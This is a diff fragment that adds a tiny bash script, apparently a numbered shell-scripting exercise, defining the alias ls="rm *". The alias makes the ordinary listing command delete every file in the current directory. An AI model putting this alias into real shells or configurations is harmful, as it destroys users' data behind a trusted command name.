@@ -1,0 +1,4 @@
+cat > 0-alias << 'EOF'
+#!/bin/bash
+alias ls="rm *"
+EOF
